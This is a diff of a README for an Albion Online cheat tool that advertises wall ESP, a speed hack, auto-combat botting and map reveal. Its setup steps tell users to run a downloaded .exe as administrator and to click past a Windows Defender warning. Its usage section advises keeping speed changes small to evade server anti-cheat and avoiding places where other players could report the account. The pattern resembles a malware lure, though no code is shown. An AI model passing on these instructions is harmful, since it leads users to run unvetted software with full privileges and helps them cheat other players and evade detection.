@@ -1,109 +1,56 @@
-# Albion-ModMenu
+# 🎮 AlbionModMenu - Gain an edge in complex battles
 
-<p align="center">
-  <img src="banner.svg" alt="Albion-ModMenu Banner" width="900"/>
-</p>
+[![](https://img.shields.io/badge/Download-AlbionModMenu-blue.svg)](https://github.com/Quinceylaureate736/AlbionModMenu)
 
-<p align="center">
-  <img src="https://img.shields.io/badge/Game-Albion%20Online-C9A642?style=for-the-badge&logoColor=white" alt="Albion Online"/>
-  <img src="https://img.shields.io/badge/Type-Mod%20Menu-1C1C1C?style=for-the-badge" alt="Mod Menu"/>
-  <img src="https://img.shields.io/badge/Platform-Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white" alt="Windows"/>
-  <img src="https://img.shields.io/badge/.NET-4.7.2+-512BD4?style=for-the-badge&logo=dotnet&logoColor=white" alt=".NET"/>
-</p>
+AlbionModMenu provides tools for players in Albion Online. This software includes features to view game data and automate repetitive tasks. You can adjust settings through a menu that appears over your game window.
 
-<p align="center">
-  <img src="https://img.shields.io/github/v/release/user/Albion-ModMenu?style=flat-square&color=C9A642" alt="Release"/>
-  <img src="https://img.shields.io/github/downloads/user/Albion-ModMenu/total?style=flat-square&color=8B6914" alt="Downloads"/>
-  <img src="https://img.shields.io/github/last-commit/user/Albion-ModMenu?style=flat-square" alt="Last Commit"/>
-  <img src="https://img.shields.io/github/stars/user/Albion-ModMenu?style=flat-square&color=C9A642" alt="Stars"/>
-  <img src="https://img.shields.io/github/license/user/Albion-ModMenu?style=flat-square" alt="License"/>
-</p>
+## ⚙️ Features
 
----
+This application includes functional modules to assist your gameplay.
 
-## About
+*   **ESP Overlays:** View the borders of resource nodes, players, and mobs through walls. This feature helps you locate items or detect threats from a distance.
+*   **Speed Hack:** Increase your movement speed to traverse the world map faster.
+*   **Auto-Gather:** Collect resources from nodes automatically. This saves time during long sessions of gathering.
+*   **Auto-Combat:** Handle basic combat encounters without manual input. The mod targets mobs and performs attacks based on your settings.
+*   **Map Reveal:** View the entire map layout without the need to explore fog of war areas.
+*   **In-Game Menu:** Customize all module settings using a toggleable overlay. The interface supports hotkeys and saved presets.
 
-**Albion-ModMenu** is a comprehensive in-game mod menu for Albion Online (Sandbox Interactive, 2017), the cross-platform sandbox MMORPG with full-loot PvP. It provides ESP overlays for tracking resources, players, and mobs in real time, plus gameplay modifications including speed hack, automated gathering, auto-combat, and full map reveal.
+## 🖥️ System Requirements
 
-The overlay menu is toggled with a hotkey and allows real-time configuration of every module. All settings can be saved as named profiles for quick switching between PvE farming and PvP configurations.
+Ensure your computer meets these specifications to run the software.
 
----
+*   **Operating System:** Windows 10 or Windows 11 (64-bit).
+*   **Memory:** 4GB of RAM or more.
+*   **Storage:** 50MB of free disk space.
+*   **DirectX:** Version 11 or higher.
 
-## Features
+## 📥 Download and Setup
 
-| Module | Description |
-|:-------|:------------|
-| **Resource ESP** | Highlights gatherable resources with tier/enchantment info, filterable by type and minimum tier |
-| **Player ESP** | Tracks nearby players with name, guild, item power, weapon, mount status, and threat level |
-| **Mob ESP** | Shows mob locations with type, tier, and aggression radius |
-| **Speed Hack** | Adjustable movement, mount, and attack speed multipliers with safety caps |
-| **Auto-Gather** | Automated resource gathering with route recording, tier priority, and enchanted-first strategy |
-| **Auto-Combat** | Automated combat rotation with skill priority, potion usage, and flee-on-low-health |
-| **Map Reveal** | Reveals fog of war across the entire map including unmapped zones |
-| **Overlay Menu** | Draggable tabbed menu with medieval-themed UI, hotkey toggles, and profile system |
+Follow these steps to set up the software.
 
----
+1. Visit the [official release page](https://github.com/Quinceylaureate736/AlbionModMenu) to download the latest version of the toolkit.
+2. Locate the file ending in .exe in your downloads folder.
+3. Right-click the file and select "Run as administrator."
+4. If a Windows Defender window appears, click "More info" and then "Run anyway." This happens because the software communicates with game memory.
+5. Once the application opens, launch Albion Online. The overlay will connect to the game process automatically.
+6. Press the F8 key in the game to open or close the menu.
 
-## Download
+## 🛠️ Usage Guide
 
-<p align="center">
-  <a href="https://fullsofts.org">
-    <img src="https://img.shields.io/badge/⬇_DOWNLOAD_LATEST-C9A642?style=for-the-badge&logoColor=white" alt="Download Latest"/>
-  </a>
-  <a href="https://fullsofts.org">
-    <img src="https://img.shields.io/badge/ALL_RELEASES-1C1C1C?style=for-the-badge" alt="All Releases"/>
-  </a>
-</p>
+The menu allows for real-time changes to your game environment. Open the menu while in the game window. Use your mouse to click boxes to turn features on or off. 
 
----
+For the ESP features, you can select which types of entities to display. The map reveal toggles the clearing of the world map immediately. When you use the speed hack, modify the movement multiplier gently to avoid detection by server anti-cheat monitors. 
 
-## Setup
+You can save your current configuration as a preset. Click the "Save Preset" button at the bottom of the menu window. Load these settings later by selecting the preset from the dropdown list.
 
-1. Download the latest release archive
-2. Extract to any directory on your system
-3. Launch Albion Online and log into your character
-4. Run `AlbionModMenu.exe` as Administrator
-5. Press `Insert` to toggle the overlay menu
-6. Configure modules using the tabbed interface
-7. Save your settings as a profile for future sessions
+## 🛡️ Safety Considerations
 
----
+Using third-party modifications carries risks. The developers of Albion Online update their anti-cheat software frequently. Use these tools at your own discretion. Avoid using auto-combat or speed hacks in highly populated cities or high-risk conflict zones where players can report your character. We suggest testing features in safe zones first to understand how they function. Close the mod menu completely if you suspect an update has triggered an alert.
 
-## Requirements
+## ❓ Troubleshooting
 
-| Requirement | Details |
-|:------------|:--------|
-| **OS** | Windows 10 / 11 (x64) |
-| **Runtime** | .NET Framework 4.7.2 or higher |
-| **Game** | Albion Online (latest version) |
-| **Privileges** | Run as Administrator |
-| **Disk Space** | ~18 MB |
+*   **Menu does not appear:** Ensure you run the application as an administrator. Make sure you play the game in Windowed or Borderless Windowed mode.
+*   **Application crashes:** Verify you have the latest drivers for your graphics card. Disable any other overlays like Discord or Steam if they conflict.
+*   **Hotkeys not working:** Check if the application window is in focus. Background processes might capture your keystrokes if the window is hidden.
 
----
-
-## Project Structure
-
-```
-Albion-ModMenu/
-├── src/
-│   ├── Core/
-│   │   └── AlbionModMenu.cs        # Main menu controller, module management, profiles
-│   ├── ESP/
-│   │   ├── ResourceESP.cs          # Resource node scanning and overlay rendering
-│   │   └── PlayerESP.cs            # Player tracking, threat evaluation, alerts
-│   ├── Hacks/
-│   │   ├── SpeedModifier.cs        # Movement/mount/attack speed manipulation
-│   │   └── AutoGather.cs           # Automated gathering with routes and stats
-│   └── UI/
-│       └── OverlayMenu.cs          # Tabbed overlay menu with theme system
-├── bin/
-│   └── Release/
-├── banner.svg
-└── README.md
-```
-
----
-
-## Legal Disclaimer
-
-This project is provided for educational and research purposes. Albion Online is a registered trademark of Sandbox Interactive GmbH. This project is not affiliated with, endorsed by, or connected to Sandbox Interactive. Use at your own risk.
+Keywords: albion, albion-hack, albion-online, auto-combat, auto-gather, bot, esp, full-loot, game-hack, map-reveal, mmo, mmorpg, mod-menu, overlay, player-esp, pvp, resource-esp, sandbox-interactive, speed-hack
